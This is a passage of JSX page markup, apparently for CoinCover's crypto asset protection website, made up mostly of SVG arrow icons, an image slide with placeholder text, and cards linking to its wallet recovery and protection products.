                                                  d="M22.8269 22.7963C22.725 22.8982 22.6026 22.9798 22.4701 23.0307C22.3376 23.0817 22.1949 23.1021 22.0624 23.1123C21.777 23.1123 21.4915 22.99 21.2877 22.7861C21.0838 22.5822 20.9717 22.307 20.9717 22.0216C20.9819 21.8891 21.0023 21.7463 21.0532 21.6138C21.2265 21.2163 21.6343 20.9513 22.0522 20.9411C22.3376 20.9411 22.623 21.0634 22.8167 21.2571C23.0206 21.4609 23.1429 21.7463 23.1429 22.0318C23.1429 22.3172 23.0308 22.5924 22.8269 22.7963Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M22.8166 34.7123C22.6229 34.906 22.3375 35.0283 22.0521 35.0283C21.7667 35.0283 21.4813 34.906 21.2876 34.7123C21.0837 34.5085 20.9614 34.223 20.9716 33.9478C20.9716 33.377 21.4915 32.8571 22.0521 32.8673C22.3273 32.8571 22.6127 32.9794 22.8166 33.1833C23.0205 33.3872 23.1326 33.6624 23.1326 33.9478C23.1326 34.2332 23.0205 34.5085 22.8166 34.7123Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M26.5678 29.432C26.1397 29.0039 26.1499 28.3209 26.5678 27.903C26.9858 27.4851 27.6687 27.4749 28.0969 27.903C28.5148 28.3209 28.5148 29.0141 28.0969 29.432C27.6789 29.8499 26.9858 29.8499 26.5678 29.432ZM23.9277 32.0721C23.4996 31.644 23.5098 30.961 23.9277 30.5431C24.3558 30.115 25.0286 30.115 25.4567 30.5431C25.8747 30.961 25.8849 31.644 25.4567 32.0721C25.0388 32.4901 24.3457 32.4901 23.9277 32.0721Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M30.737 26.7919C30.5331 26.9958 30.2579 27.1079 29.9724 27.1079C29.687 27.1079 29.4016 26.9856 29.2079 26.7919C29.0041 26.588 28.8817 26.3026 28.8919 26.0274C28.8919 25.4566 29.4016 24.9469 29.9724 24.9469C30.2477 24.9367 30.5331 25.059 30.737 25.2629C30.9408 25.4668 31.053 25.742 31.053 26.0274C31.053 26.3128 30.9408 26.588 30.737 26.7919Z"
                                                  fill="#3939EF"
                                                />
                                              </g>
                                              <defs>
                                                <clipPath id="clip0_430_39555">
                                                  <rect
                                                    width="18.9856"
                                                    height={19}
                                                    fill="white"
                                                    transform="translate(14.5701 27.9949) rotate(-45)"
                                                  />
                                                </clipPath>
                                              </defs>
                                            </svg>
                                          </a>
                                        </div>
                                      </div>
                                    </div>
                                    <div className="slide">
                                      <div className="slide_inner">
                                        <div className="image">
                                          <img
                                            src="https://www.coincover.com/hs-fs/hubfs/Coincover_April2025_CTA9/images/2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg?width=1920&height=1280&name=2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg"
                                            alt="image"
                                            loading="lazy"
                                            width={1920}
                                            height={1280}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                            srcSet="https://www.coincover.com/hs-fs/hubfs/Coincover_April2025_CTA9/images/2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg?width=960&height=640&name=2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg 960w, https://www.coincover.com/hs-fs/hubfs/Coincover_April2025_CTA9/images/2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg?width=1920&height=1280&name=2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg 1920w, https://www.coincover.com/hs-fs/hubfs/Coincover_April2025_CTA9/images/2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg?width=2880&height=1920&name=2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg 2880w, https://www.coincover.com/hs-fs/hubfs/Coincover_April2025_CTA9/images/2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg?width=3840&height=2560&name=2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg 3840w, https://www.coincover.com/hs-fs/hubfs/Coincover_April2025_CTA9/images/2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg?width=4800&height=3200&name=2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg 4800w, https://www.coincover.com/hs-fs/hubfs/Coincover_April2025_CTA9/images/2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg?width=5760&height=3840&name=2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg 5760w"
                                            sizes="(max-width: 1920px) 100vw, 1920px"
                                          />
                                        </div>
                                        <div className="description">
                                          <h6>
                                            <a href="">
                                              Horem ipsum dolor sit amet,
                                              consectetur adipiscing elit. Nunc
                                              vulputate libero et velit
                                              interdum, ac aliquet odio mattis.
                                            </a>
                                          </h6>
                                        </div>
                                        <div className="link">
                                          <a href="">
                                            <svg
                                              width={56}
                                              height={56}
                                              viewBox="0 0 56 56"
                                              fill="none"
                                              xmlns="http://www.w3.org/2000/svg"
                                            >
                                              <g clipPath="url(#clip0_430_39555)">
                                                <path
                                                  d="M34.7226 34.7123C34.6207 34.8143 34.5086 34.8856 34.3658 34.9468C34.2333 34.9977 34.1008 35.0283 33.9581 35.0283C33.6727 35.0283 33.3975 34.9162 33.1936 34.7123C33.0917 34.6104 33.0101 34.4881 32.9591 34.3556C32.9082 34.223 32.8776 34.0905 32.8776 33.9478C32.8776 33.377 33.3873 32.8673 33.9581 32.8673C34.2435 32.8673 34.5187 32.9794 34.7226 33.1833C34.9265 33.3872 35.0386 33.6624 35.0386 33.9478C35.0386 34.2332 34.9265 34.5085 34.7226 34.7123Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M33.9479 31.0631C33.3567 31.0631 32.8776 30.584 32.8674 29.9826C32.8776 29.3812 33.3567 28.9021 33.9479 28.9021C34.5493 28.8919 35.0386 29.3812 35.0284 29.9826C35.0284 30.2884 34.9061 30.5534 34.7124 30.7471C34.5085 30.951 34.2435 31.0733 33.9377 31.0733L33.9479 31.0631ZM33.9581 27.0978C33.3567 27.0877 32.8776 26.6086 32.8674 26.0071C32.8674 25.4159 33.3567 24.9266 33.9479 24.9266C34.5493 24.9368 35.0284 25.4159 35.0386 26.0173C35.0284 26.3129 34.9061 26.578 34.7124 26.7717C34.5187 26.9653 34.2537 27.0877 33.9581 27.0978Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M34.7124 22.8166C34.5187 23.0103 34.2333 23.1326 33.9479 23.1326C33.6625 23.1326 33.3771 23.0103 33.1834 22.8166C33.0815 22.7146 32.9999 22.5923 32.9489 22.4598C32.898 22.3273 32.8674 22.1948 32.8674 22.0521C32.8674 21.4812 33.3771 20.9716 33.9479 20.9716C34.2333 20.9716 34.5086 21.0837 34.7124 21.2876C34.9163 21.4914 35.0284 21.7666 35.0284 22.0521C35.0284 22.3375 34.9163 22.6127 34.7124 22.8166Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M29.9826 23.1224C29.3914 23.1224 28.9021 22.6332 28.9021 22.0419C28.9123 21.4405 29.3914 20.9614 29.9826 20.9614C30.584 20.9512 31.0631 21.4507 31.0631 22.0419C31.0631 22.3477 30.9408 22.6128 30.7471 22.8064C30.5534 23.0001 30.2884 23.1224 29.9826 23.1224ZM26.0173 23.1122C25.4261 23.1122 24.947 22.6332 24.9368 22.0317C24.9368 21.4405 25.4261 20.9512 26.0173 20.9512C26.6188 20.9614 27.0978 21.4405 27.0978 22.0317C27.0978 22.3375 26.9755 22.6026 26.7818 22.7963C26.5882 22.9899 26.3231 23.1122 26.0173 23.1122Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M22.8269 22.7963C22.725 22.8982 22.6026 22.9798 22.4701 23.0307C22.3376 23.0817 22.1949 23.1021 22.0624 23.1123C21.777 23.1123 21.4915 22.99 21.2877 22.7861C21.0838 22.5822 20.9717 22.307 20.9717 22.0216C20.9819 21.8891 21.0023 21.7463 21.0532 21.6138C21.2265 21.2163 21.6343 20.9513 22.0522 20.9411C22.3376 20.9411 22.623 21.0634 22.8167 21.2571C23.0206 21.4609 23.1429 21.7463 23.1429 22.0318C23.1429 22.3172 23.0308 22.5924 22.8269 22.7963Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M22.8166 34.7123C22.6229 34.906 22.3375 35.0283 22.0521 35.0283C21.7667 35.0283 21.4813 34.906 21.2876 34.7123C21.0837 34.5085 20.9614 34.223 20.9716 33.9478C20.9716 33.377 21.4915 32.8571 22.0521 32.8673C22.3273 32.8571 22.6127 32.9794 22.8166 33.1833C23.0205 33.3872 23.1326 33.6624 23.1326 33.9478C23.1326 34.2332 23.0205 34.5085 22.8166 34.7123Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M26.5678 29.432C26.1397 29.0039 26.1499 28.3209 26.5678 27.903C26.9858 27.4851 27.6687 27.4749 28.0969 27.903C28.5148 28.3209 28.5148 29.0141 28.0969 29.432C27.6789 29.8499 26.9858 29.8499 26.5678 29.432ZM23.9277 32.0721C23.4996 31.644 23.5098 30.961 23.9277 30.5431C24.3558 30.115 25.0286 30.115 25.4567 30.5431C25.8747 30.961 25.8849 31.644 25.4567 32.0721C25.0388 32.4901 24.3457 32.4901 23.9277 32.0721Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M30.737 26.7919C30.5331 26.9958 30.2579 27.1079 29.9724 27.1079C29.687 27.1079 29.4016 26.9856 29.2079 26.7919C29.0041 26.588 28.8817 26.3026 28.8919 26.0274C28.8919 25.4566 29.4016 24.9469 29.9724 24.9469C30.2477 24.9367 30.5331 25.059 30.737 25.2629C30.9408 25.4668 31.053 25.742 31.053 26.0274C31.053 26.3128 30.9408 26.588 30.737 26.7919Z"
                                                  fill="#3939EF"
                                                />
                                              </g>
                                              <defs>
                                                <clipPath id="clip0_430_39555">
                                                  <rect
                                                    width="18.9856"
                                                    height={19}
                                                    fill="white"
                                                    transform="translate(14.5701 27.9949) rotate(-45)"
                                                  />
                                                </clipPath>
                                              </defs>
                                            </svg>
                                          </a>
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                        {/*end widget-span */}
                      </div>
                      {/*end row*/}
                    </div>
                    {/*end row-wrapper */}
                  </div>
                  {/*end widget-span */}
                </div>
                {/*end row*/}
              </div>
              {/*end row-wrapper */}
              <div className="row-fluid-wrapper row-depth-1 row-number-17 dnd-section dnd_area-row-8-force-full-width-section">
                <div className="row-fluid ">
                  <div
                    className="span12 widget-span widget-type-cell dnd-column"
                    style={{}}
                    data-widget-type="cell"
                    data-x={0}
                    data-w={12}
                  >
                    <div className="row-fluid-wrapper row-depth-1 row-number-18 dnd-row">
                      <div className="row-fluid ">
                        <div
                          className="span12 widget-span widget-type-custom_widget dnd-module"
                          style={{}}
                          data-widget-type="custom_widget"
                          data-x={0}
                          data-w={12}
                        >
                          <div
                            id="hs_cos_wrapper_widget_1748080011019"
                            className="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module"
                            style={{}}
                            data-hs-cos-general-type="widget"
                            data-hs-cos-type="module"
                          >
                            <div className="protecting_your_assets_wrapper">
                              <div className="content-wrapper">
                                <div className="top_content">
                                  <h2>
                                    Just discovered CoinCover on your crypto
                                    exchange or wallet?
                                  </h2>
                                  <p className="text-size-large">
                                    We’re the experts in digital assets and
                                    crypto security. Find out who we are, and
                                    how we keep your digital assets safe.
                                  </p>
                                </div>
                                <div className="cards_wrapper mobile_hidden">
                                  <div className="card">
                                    <a
                                      className="absolute_position"
                                      href="https://www.coincover.com/consumers/products/recover"
                                    ></a>
                                    <h6>
                                      If the worst happens, we help restore
                                      wallet access, quickly and easily.
                                    </h6>
                                    <div className="arrow_icon">
                                      <svg
                                        width={56}
                                        height={57}
                                        viewBox="0 0 56 57"
                                        fill="none"
                                        xmlns="http://www.w3.org/2000/svg"
                                      >
                                        {" "}
                                        <g clipPath="url(#clip0_1897_185418)">
                                          {" "}
                                          <path
                                            d="M34.7208 35.3793C34.6189 35.4813 34.5068 35.5526 34.3641 35.6138C34.2316 35.6647 34.099 35.6953 33.9563 35.6953C33.6709 35.6953 33.3957 35.5832 33.1918 35.3793C33.0899 35.2774 33.0083 35.1551 32.9574 35.0225C32.9064 34.89 32.8758 34.7575 32.8758 34.6148C32.8758 34.044 33.3855 33.5343 33.9563 33.5343C34.2417 33.5343 34.517 33.6464 34.7208 33.8503C34.9247 34.0542 35.0368 34.3294 35.0368 34.6148C35.0368 34.9002 34.9247 35.1754 34.7208 35.3793Z"
                                            fill="#3939EF"
                                          />{" "}
                                          <path
                                            d="M33.9453 31.7245C33.354 31.7245 32.8749 31.2454 32.8647 30.644C32.8749 30.0426 33.354 29.5635 33.9453 29.5635C34.5467 29.5533 35.036 30.0426 35.0258 30.644C35.0258 30.9498 34.9034 31.2148 34.7098 31.4085C34.5059 31.6124 34.2409 31.7347 33.9351 31.7347L33.9453 31.7245ZM33.9554 27.7592C33.354 27.749 32.8749 27.2699 32.8647 26.6685C32.8647 26.0773 33.354 25.588 33.9453 25.588C34.5467 25.5982 35.0258 26.0773 35.036 26.6787C35.0258 26.9743 34.9034 27.2394 34.7098 27.433C34.5161 27.6267 34.2511 27.749 33.9554 27.7592Z"
                                            fill="#3939EF"
                                          />{" "}
                                          <path
                                            d="M34.7091 23.4809C34.5154 23.6746 34.23 23.7969 33.9446 23.7969C33.6592 23.7969 33.3738 23.6746 33.1801 23.4809C33.0782 23.3789 32.9966 23.2566 32.9456 23.1241C32.8947 22.9916 32.8641 22.8591 32.8641 22.7164C32.8641 22.1455 33.3738 21.6359 33.9446 21.6359C34.23 21.6359 34.5053 21.748 34.7091 21.9519C34.913 22.1557 35.0251 22.431 35.0251 22.7164C35.0251 23.0018 34.913 23.277 34.7091 23.4809Z"
                                            fill="#3939EF"
                                          />{" "}
                                          <path
                                            d="M29.9814 23.786C29.3902 23.786 28.9009 23.2967 28.9009 22.7055C28.9111 22.1041 29.3902 21.625 29.9814 21.625C30.5828 21.6148 31.0619 22.1143 31.0619 22.7055C31.0619 23.0113 30.9396 23.2763 30.7459 23.47C30.5522 23.6637 30.2872 23.786 29.9814 23.786ZM26.0161 23.7758C25.4249 23.7758 24.9458 23.2967 24.9356 22.6953C24.9356 22.1041 25.4249 21.6148 26.0161 21.6148C26.6175 21.625 27.0966 22.1041 27.0966 22.6953C27.0966 23.0011 26.9743 23.2661 26.7806 23.4598C26.587 23.6535 26.3219 23.7758 26.0161 23.7758Z"
                                            fill="#3939EF"
                                          />{" "}
                                          <path
                                            d="M22.8268 23.4618C22.7248 23.5637 22.6025 23.6453 22.47 23.6963C22.3375 23.7472 22.1948 23.7676 22.0623 23.7778C21.7768 23.7778 21.4914 23.6555 21.2875 23.4516C21.0837 23.2477 20.9716 22.9725 20.9716 22.6871C20.9817 22.5546 21.0021 22.4119 21.0531 22.2794C21.2264 21.8818 21.6341 21.6168 22.0521 21.6066C22.3375 21.6066 22.6229 21.7289 22.8166 21.9226C23.0204 22.1265 23.1428 22.4119 23.1428 22.6973C23.1428 22.9827 23.0306 23.2579 22.8268 23.4618Z"
                                            fill="#3939EF"
                                          />{" "}
                                          <path
                                            d="M22.8185 35.3715C22.6248 35.5652 22.3394 35.6875 22.054 35.6875C21.7686 35.6875 21.4832 35.5652 21.2895 35.3715C21.0856 35.1676 20.9633 34.8822 20.9735 34.607C20.9735 34.0362 21.4933 33.5163 22.054 33.5265C22.3292 33.5163 22.6146 33.6386 22.8185 33.8425C23.0224 34.0464 23.1345 34.3216 23.1345 34.607C23.1345 34.8924 23.0224 35.1676 22.8185 35.3715Z"
                                            fill="#3939EF"
                                          />{" "}
                                          <path
                                            d="M26.5687 30.0931C26.1406 29.665 26.1508 28.9821 26.5687 28.5641C26.9866 28.1462 27.6696 28.136 28.0977 28.5641C28.5156 28.9821 28.5156 29.6752 28.0977 30.0931C27.6798 30.5111 26.9866 30.5111 26.5687 30.0931ZM23.9286 32.7333C23.5004 32.3051 23.5106 31.6222 23.9286 31.2042C24.3567 30.7761 25.0295 30.7761 25.4576 31.2042C25.8755 31.6222 25.8857 32.3051 25.4576 32.7333C25.0397 33.1512 24.3465 33.1512 23.9286 32.7333Z"
                                            fill="#3939EF"
                                          />{" "}
                                          <path
                                            d="M30.7365 27.4574C30.5326 27.6613 30.2574 27.7734 29.972 27.7734C29.6865 27.7734 29.4011 27.6511 29.2074 27.4574C29.0036 27.2536 28.8813 26.9682 28.8914 26.6929C28.8914 26.1221 29.4011 25.6124 29.972 25.6124C30.2472 25.6022 30.5326 25.7245 30.7365 25.9284C30.9403 26.1323 31.0525 26.4075 31.0525 26.6929C31.0525 26.9783 30.9403 27.2536 30.7365 27.4574Z"
                                            fill="#3939EF"
                                          />{" "}
                                        </g>{" "}
                                        <defs>
                                          {" "}
                                          <clipPath id="clip0_1897_185418">
                                            {" "}
                                            <rect
                                              width="18.9856"
                                              height={19}
                                              fill="white"
                                              transform="translate(14.5703 28.6562) rotate(-45)"
                                            />{" "}
                                          </clipPath>{" "}
                                        </defs>{" "}
                                      </svg>
                                    </div>
                                  </div>
                                  <div className="card">
                                    <a
                                      className="absolute_position"
                                      href="https://www.coincover.com/consumers/products/protect"
                                    ></a>
                                    <h6>
                                      Safeguard your digital assets against
                                      hackers, scammers and targeted attacks.
                                    </h6>
                                    <div className="arrow_icon">
                                      <svg
                                        width={56}
                                        height={57}
                                        viewBox="0 0 56 57"
                                        fill="none"
                                        xmlns="http://www.w3.org/2000/svg"
                                      >
                                        {" "}
                                        <g clipPath="url(#clip0_1897_185418)">
                                          {" "}
                                          <path
                                            d="M34.7208 35.3793C34.6189 35.4813 34.5068 35.5526 34.3641 35.6138C34.2316 35.6647 34.099 35.6953 33.9563 35.6953C33.6709 35.6953 33.3957 35.5832 33.1918 35.3793C33.0899 35.2774 33.0083 35.1551 32.9574 35.0225C32.9064 34.89 32.8758 34.7575 32.8758 34.6148C32.8758 34.044 33.3855 33.5343 33.9563 33.5343C34.2417 33.5343 34.517 33.6464 34.7208 33.8503C34.9247 34.0542 35.0368 34.3294 35.0368 34.6148C35.0368 34.9002 34.9247 35.1754 34.7208 35.3793Z"
                                            fill="#3939EF"
                                          />{" "}
                                          <path
                                            d="M33.9453 31.7245C33.354 31.7245 32.8749 31.2454 32.8647 30.644C32.8749 30.0426 33.354 29.5635 33.9453 29.5635C34.5467 29.5533 35.036 30.0426 35.0258 30.644C35.0258 30.9498 34.9034 31.2148 34.7098 31.4085C34.5059 31.6124 34.2409 31.7347 33.9351 31.7347L33.9453 31.7245ZM33.9554 27.7592C33.354 27.749 32.8749 27.2699 32.8647 26.6685C32.8647 26.0773 33.354 25.588 33.9453 25.588C34.5467 25.5982 35.0258 26.0773 35.036 26.6787C35.0258 26.9743 34.9034 27.2394 34.7098 27.433C34.5161 27.6267 34.2511 27.749 33.9554 27.7592Z"
                                            fill="#3939EF"
                                          />{" "}
                                          <path
                                            d="M34.7091 23.4809C34.5154 23.6746 34.23 23.7969 33.9446 23.7969C33.6592 23.7969 33.3738 23.6746 33.1801 23.4809C33.0782 23.3789 32.9966 23.2566 32.9456 23.1241C32.8947 22.9916 32.8641 22.8591 32.8641 22.7164C32.8641 22.1455 33.3738 21.6359 33.9446 21.6359C34.23 21.6359 34.5053 21.748 34.7091 21.9519C34.913 22.1557 35.0251 22.431 35.0251 22.7164C35.0251 23.0018 34.913 23.277 34.7091 23.4809Z"
                                            fill="#3939EF"
                                          />{" "}
                                          <path
                                            d="M29.9814 23.786C29.3902 23.786 28.9009 23.2967 28.9009 22.7055C28.9111 22.1041 29.3902 21.625 29.9814 21.625C30.5828 21.6148 31.0619 22.1143 31.0619 22.7055C31.0619 23.0113 30.9396 23.2763 30.7459 23.47C30.5522 23.6637 30.2872 23.786 29.9814 23.786ZM26.0161 23.7758C25.4249 23.7758 24.9458 23.2967 24.9356 22.6953C24.9356 22.1041 25.4249 21.6148 26.0161 21.6148C26.6175 21.625 27.0966 22.1041 27.0966 22.6953C27.0966 23.0011 26.9743 23.2661 26.7806 23.4598C26.587 23.6535 26.3219 23.7758 26.0161 23.7758Z"
                                            fill="#3939EF"
                                          />{" "}
                                          <path
                                            d="M22.8268 23.4618C22.7248 23.5637 22.6025 23.6453 22.47 23.6963C22.3375 23.7472 22.1948 23.7676 22.0623 23.7778C21.7768 23.7778 21.4914 23.6555 21.2875 23.4516C21.0837 23.2477 20.9716 22.9725 20.9716 22.6871C20.9817 22.5546 21.0021 22.4119 21.0531 22.2794C21.2264 21.8818 21.6341 21.6168 22.0521 21.6066C22.3375 21.6066 22.6229 21.7289 22.8166 21.9226C23.0204 22.1265 23.1428 22.4119 23.1428 22.6973C23.1428 22.9827 23.0306 23.2579 22.8268 23.4618Z"
                                            fill="#3939EF"
                                          />{" "}
                                          <path
                                            d="M22.8185 35.3715C22.6248 35.5652 22.3394 35.6875 22.054 35.6875C21.7686 35.6875 21.4832 35.5652 21.2895 35.3715C21.0856 35.1676 20.9633 34.8822 20.9735 34.607C20.9735 34.0362 21.4933 33.5163 22.054 33.5265C22.3292 33.5163 22.6146 33.6386 22.8185 33.8425C23.0224 34.0464 23.1345 34.3216 23.1345 34.607C23.1345 34.8924 23.0224 35.1676 22.8185 35.3715Z"
                                            fill="#3939EF"
                                          />{" "}
                                          <path
                                            d="M26.5687 30.0931C26.1406 29.665 26.1508 28.9821 26.5687 28.5641C26.9866 28.1462 27.6696 28.136 28.0977 28.5641C28.5156 28.9821 28.5156 29.6752 28.0977 30.0931C27.6798 30.5111 26.9866 30.5111 26.5687 30.0931ZM23.9286 32.7333C23.5004 32.3051 23.5106 31.6222 23.9286 31.2042C24.3567 30.7761 25.0295 30.7761 25.4576 31.2042C25.8755 31.6222 25.8857 32.3051 25.4576 32.7333C25.0397 33.1512 24.3465 33.1512 23.9286 32.7333Z"
                                            fill="#3939EF"
                                          />{" "}
                                          <path
                                            d="M30.7365 27.4574C30.5326 27.6613 30.2574 27.7734 29.972 27.7734C29.6865 27.7734 29.4011 27.6511 29.2074 27.4574C29.0036 27.2536 28.8813 26.9682 28.8914 26.6929C28.8914 26.1221 29.4011 25.6124 29.972 25.6124C30.2472 25.6022 30.5326 25.7245 30.7365 25.9284C30.9403 26.1323 31.0525 26.4075 31.0525 26.6929C31.0525 26.9783 30.9403 27.2536 30.7365 27.4574Z"
                                            fill="#3939EF"
                                          />{" "}
                                        </g>{" "}
                                        <defs>
                                          {" "}
                                          <clipPath id="clip0_1897_185418">
                                            {" "}
                                            <rect
                                              width="18.9856"
                                              height={19}
                                              fill="white"
                                              transform="translate(14.5703 28.6562) rotate(-45)"
                                            />{" "}
                                          </clipPath>{" "}
                                        </defs>{" "}
                                      </svg>
                                    </div>
                                  </div>
                                </div>
                                <div className="custom_arrows arrowsFor_small">
                                  <div className="prev">
                                    <svg
                                      width={20}
                                      height={20}
                                      viewBox="0 0 20 20"
                                      fill="none"
                                      xmlns="http://www.w3.org/2000/svg"
                                    >
                                      <g clipPath="url(#clip0_1981_63494)">
                                        <path
                                          d="M9.99304 0.273922C10.1372 0.273922 10.2669 0.302755 10.4111 0.360418C10.5408 0.418081 10.6562 0.49016 10.7571 0.59107C10.9589 0.792891 11.0742 1.06679 11.0742 1.35511C11.0742 1.49926 11.0454 1.64342 10.9877 1.77316C10.9301 1.90291 10.858 2.01823 10.7571 2.11914C10.3534 2.52279 9.63264 2.52279 9.229 2.11914C9.02718 1.91732 8.91185 1.64342 8.91185 1.35511C8.91185 1.06679 9.02718 0.792891 9.229 0.59107C9.43082 0.389249 9.70472 0.273922 9.99304 0.273922Z"
                                          fill="#A6ADBA"
                                        />
                                        <path
                                          d="M7.95989 3.40199C8.37795 3.82005 8.37795 4.49759 7.95989 4.93007C7.52742 5.34812 6.84988 5.34812 6.43182 4.93007C5.99935 4.51201 5.99935 3.82005 6.43182 3.40199C6.64806 3.18576 6.92196 3.08485 7.19586 3.08485C7.48417 3.08485 7.75807 3.18576 7.97431 3.40199H7.95989ZM5.14882 6.19866C5.56687 6.63113 5.56687 7.30867 5.14882 7.74114C4.73076 8.1592 4.0388 8.1592 3.62074 7.74114C3.20269 7.30867 3.20269 6.63113 3.62074 6.19866C3.83698 5.99684 4.11088 5.89592 4.38478 5.89592C4.65868 5.89592 4.93258 5.99684 5.14882 6.19866Z"
                                          fill="#A6ADBA"
                                        />
                                        <path
                                          d="M1.58679 8.68799C1.86068 8.68799 2.149 8.80331 2.35082 9.00513C2.55264 9.20695 2.66797 9.49527 2.66797 9.76917C2.66797 9.91333 2.63914 10.0575 2.58147 10.1872C2.52381 10.317 2.45173 10.4323 2.35082 10.5332C1.94718 10.9368 1.22639 10.9368 0.822749 10.5332C0.620928 10.3314 0.505601 10.0575 0.505601 9.76917C0.505601 9.48085 0.620928 9.20695 0.822749 9.00513C1.02457 8.80331 1.29847 8.68799 1.58679 8.68799Z"
                                          fill="#A6ADBA"
                                        />
                                        <path
                                          d="M5.14761 11.8161C5.56567 12.2341 5.56567 12.9261 5.14761 13.3441C4.71513 13.7622 4.03759 13.7622 3.61953 13.3441C3.18706 12.9261 3.20148 12.2341 3.61953 11.8161C3.83577 11.5998 4.10967 11.4989 4.38357 11.4989C4.65747 11.4989 4.93137 11.5998 5.14761 11.8161ZM7.94427 14.6271C8.36233 15.0452 8.36233 15.7227 7.94427 16.1552C7.52621 16.5733 6.83425 16.5733 6.4162 16.1552C5.99814 15.7227 5.99814 15.0452 6.4162 14.6271C6.63243 14.4109 6.90633 14.31 7.18023 14.31C7.45413 14.31 7.72803 14.4109 7.94427 14.6271Z"
                                          fill="#A6ADBA"
                                        />
                                        <path
                                          d="M9.97741 17.1083C10.1216 17.1083 10.2657 17.1371 10.3955 17.1948C10.5252 17.2524 10.6405 17.3389 10.7414 17.4254C10.9433 17.6272 11.0586 17.9156 11.0586 18.2039C11.0586 18.4922 10.9433 18.7661 10.7414 18.9679C10.6405 19.0544 10.5252 19.1409 10.3955 19.1986C9.99183 19.3571 9.5161 19.2562 9.21337 18.9679C9.01155 18.7661 8.89623 18.4778 8.89623 18.2039C8.89623 17.9156 9.01155 17.6272 9.21337 17.4254C9.41519 17.2236 9.68909 17.1083 9.97741 17.1083Z"
                                          fill="#A6ADBA"
                                        />
                                        <path
                                          d="M18.411 8.68799C18.6849 8.68799 18.9732 8.80331 19.175 9.00513C19.3769 9.20695 19.4922 9.49527 19.4922 9.76917C19.4922 10.0575 19.3769 10.3458 19.175 10.5332C18.7714 10.9368 18.0362 10.9368 17.647 10.5332C17.4451 10.3458 17.3298 10.0575 17.3298 9.76917C17.3298 9.48085 17.4451 9.20695 17.647 9.00513C17.8488 8.80331 18.1227 8.68799 18.411 8.68799Z"
                                          fill="#A6ADBA"
                                        />
                                        <path
                                          d="M12.0241 9.77038C12.0241 10.3758 11.534 10.8516 10.9429 10.8516C10.3519 10.8516 9.86176 10.3758 9.86176 9.77038C9.86176 9.17933 10.3519 8.6892 10.9429 8.6892C11.534 8.6892 12.0241 9.17933 12.0241 9.77038ZM15.7578 9.77038C15.7578 10.3758 15.2677 10.8516 14.6766 10.8516C14.0712 10.8516 13.5954 10.3758 13.5954 9.77038C13.5954 9.17933 14.0712 8.6892 14.6766 8.6892C15.2677 8.6892 15.7578 9.17933 15.7578 9.77038Z"
                                          fill="#A6ADBA"
                                        />
                                        <path
                                          d="M7.21178 8.68799C7.5001 8.68799 7.774 8.80331 7.97582 9.00513C8.17764 9.20695 8.29297 9.49527 8.29297 9.76917C8.29297 10.0575 8.17764 10.3458 7.97582 10.5332C7.57218 10.9368 6.85139 10.9368 6.44775 10.5332C6.24593 10.3458 6.1306 10.0575 6.1306 9.76917C6.1306 9.48085 6.24593 9.20695 6.44775 9.00513C6.64957 8.80331 6.92347 8.68799 7.21178 8.68799Z"
                                          fill="#A6ADBA"
                                        />
                                      </g>
                                      <defs>
                                        <clipPath id="clip0_1981_63494">
                                          <rect
                                            width="18.9856"
                                            height={19}
                                            fill="white"
                                            transform="matrix(-1 0 0 -1 19.4922 19.2734)"
                                          />
                                        </clipPath>
                                      </defs>
                                    </svg>
                                  </div>
                                  <div className="slide-counter secondary-text-size-small">
                                    <span className="current">1</span>/
                                    <span className="total">4</span>
                                  </div>
                                  <div className="next">
                                    <svg
                                      width={20}
                                      height={20}
                                      viewBox="0 0 20 20"
                                      fill="none"
                                      xmlns="http://www.w3.org/2000/svg"
                                    >
                                      <g clipPath="url(#clip0_1981_65839)">
                                        <path
                                          d="M10.007 19.273C9.86281 19.273 9.73307 19.2441 9.58891 19.1865C9.45917 19.1288 9.34384 19.0567 9.24293 18.9558C9.04111 18.754 8.92578 18.4801 8.92578 18.1918C8.92578 18.0476 8.95461 17.9035 9.01228 17.7737C9.06994 17.644 9.14202 17.5286 9.24293 17.4277C9.64657 17.0241 10.3674 17.0241 10.771 17.4277C10.9728 17.6296 11.0881 17.9035 11.0881 18.1918C11.0881 18.4801 10.9728 18.754 10.771 18.9558C10.5692 19.1576 10.2953 19.273 10.007 19.273Z"
                                          fill="#3939EF"
                                        />
                                        <path
                                          d="M12.0401 16.1449C11.622 15.7268 11.622 15.0493 12.0401 14.6168C12.4726 14.1988 13.1501 14.1988 13.5682 14.6168C14.0007 15.0349 14.0007 15.7268 13.5682 16.1449C13.3519 16.3611 13.078 16.462 12.8041 16.462C12.5158 16.462 12.2419 16.3611 12.0257 16.1449H12.0401ZM14.8512 13.3482C14.4331 12.9157 14.4331 12.2382 14.8512 11.8057C15.2692 11.3877 15.9612 11.3877 16.3793 11.8057C16.7973 12.2382 16.7973 12.9157 16.3793 13.3482C16.163 13.55 15.8891 13.651 15.6152 13.651C15.3413 13.651 15.0674 13.55 14.8512 13.3482Z"
                                          fill="#3939EF"
                                        />
                                        <path
